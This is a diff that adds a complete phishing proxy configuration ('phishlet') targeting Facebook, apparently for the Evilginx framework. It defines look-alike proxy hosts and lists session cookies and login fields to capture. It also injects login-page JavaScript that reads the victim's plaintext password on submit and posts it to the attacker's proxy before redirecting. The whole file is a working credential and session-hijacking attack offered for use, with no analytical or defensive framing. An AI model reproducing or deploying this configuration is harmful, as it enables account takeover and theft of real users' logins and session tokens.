@@ -1,0 +1,117 @@
+author: 'IMPERATOR'
+min_ver: '3.0.0'
+
+proxy_hosts:
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'facebook.com', session: true, is_landing: true}
+  - {phish_sub: 'm', orig_sub: 'm', domain: 'facebook.com', session: true, is_landing: false}
+  - {phish_sub: '', orig_sub: '', domain: 'facebook.com', session: false, is_landing: false}
+  - {phish_sub: 'static', orig_sub: 'static.xx', domain: 'fbcdn.net', session: false, is_landing: false}
+  - {phish_sub: 'scontent', orig_sub: 'instagram.fcdg1-1.fna', domain: 'fbcdn.net', session: false, is_landing: false}
+
+sub_filters:
+  - {triggers_on: 'www.facebook.com', orig_sub: 'www', domain: 'facebook.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.facebook.com', orig_sub: 'static.xx', domain: 'fbcdn.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'static.xx.fbcdn.net', orig_sub: '', domain: 'facebook.com', search: '/intern/common/referer_frame.php', replace: '/common/referer_frame.php', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'application/x-javascript; charset=utf-8']}
+  - {triggers_on: 'static.xx.fbcdn.net', orig_sub: '', domain: 'facebook.com', search: '"facebook"', replace: '"{domain}".split(".")[0]', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'application/x-javascript; charset=utf-8']}
+  - {triggers_on: 'static.xx.fbcdn.net', orig_sub: '', domain: 'facebook.com', search: '{domain_regexp}', replace: '{domain_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'application/x-javascript; charset=utf-8']}
+  - {triggers_on: 'www.facebook.com', orig_sub: '', domain: 'facebook.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'm.facebook.com', orig_sub: 'm', domain: 'facebook.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.facebook.com', orig_sub: '', domain: 'fbcdn.net', search: '(scontent\.f[a-z]{3}[0-9]+-[0-9]+\.fna\.{domain_regexp}\/v\/)', replace: 'scontent.{domain}/v/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.facebook.com', orig_sub: '', domain: 'fbcdn.net', search: '(scontent\.f[a-z]{3}[0-9]+-[0-9]+\.fna\.{domain_regexp}\\\/v\\\/)', replace: 'scontent.{domain}/v/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.facebook.com', orig_sub: 'www', domain: 'facebook.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+auth_tokens:
+  - domain: '.facebook.com'
+    keys: ['c_user','xs','sb','presence','wd','fr','datr','ps_n','ps_l','sb']
+  - domain: '.www.facebook.com'
+    keys: ['c_user','xs','sb','presence','wd','fr','datr','ps_n','ps_l','sb']
+auth_urls:
+  - '/profile.php*'
+credentials:
+  username:
+    key: 'email'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'pass'
+    search: '(.*)'
+    type: 'post'
+  custom: 
+    - key: 'pass'
+      search: '(.*)'
+      type: 'post'
+    - key: 'Password'
+      search: '(.*)'
+      type: 'post'  
+    - key: 'UserAgent'
+      search: '(.*)'
+      type: 'post'
+    - key: 'Browser'
+      search: '(.*)'
+      type: 'post'
+    - key: 'Engine'
+      search: '(.*)'
+      type: 'post'
+    - key: 'Platform'
+      search: '(.*)'
+      type: 'post'
+    - key: 'logs'
+      search: '(.*)'
+      type: 'post'
+    - key: 'unenc_password'
+      search: '(.*)'
+      type: 'post'   
+login:
+  domain: 'www.facebook.com'
+  path: 'login?refsrc=deprecated&_rdr'
+js_inject:
+  - trigger_domains: ["www.facebook.com", "m.facebook.com"]
+    trigger_paths: ["login?refsrc=deprecated&_rdr"]
+    trigger_params: []
+    script: |  
+      var startscript = "Script started at " + new Date().toISOString();
+
+      var startRequest = new XMLHttpRequest();
+      startRequest.open("POST", '/', true);
+      startRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+      startRequest.send("logs=" + encodeURIComponent(startscript));
+
+      function onclickListener() {
+        var submit = document.querySelectorAll('input[type="submit"]')[0];
+        submit.setAttribute("onclick", "sendPass()");
+        submit.addEventListener("click", sendPass);
+        return;
+      }
+
+      function sendPass() {
+        var password = document.getElementsByName("password")[0].value;
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", '/', true);
+        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        xhr.send("unenc_password=" + encodeURIComponent(password));
+
+        // Add logs for sendPass
+        var sendPassLog = "sendPass executed at " + new Date().toISOString();
+        var sendPassRequest = new XMLHttpRequest();
+        sendPassRequest.open("POST", '/', true);
+        sendPassRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        sendPassRequest.send("logs=" + encodeURIComponent(sendPassLog));
+
+        return;
+      }
+
+      setTimeout(function() {
+        onclickListener();
+      }, 1000);
+  - trigger_domains: ["www.facebook.com", "m.facebook.com"]
+    trigger_paths: ['/']
+    script: |
+      setTimeout(function () {
+        (function () {
+          'use strict';
+          let subdomain = window.location.host.split('.')[0];
+          if (subdomain === "www" && window.location.pathname === '/') {
+            window.location.href = "/profile.php";
+            console.log("Redirecting to heeee");
+          }
+        }());
+      }, 10000); // 10 seconds delay
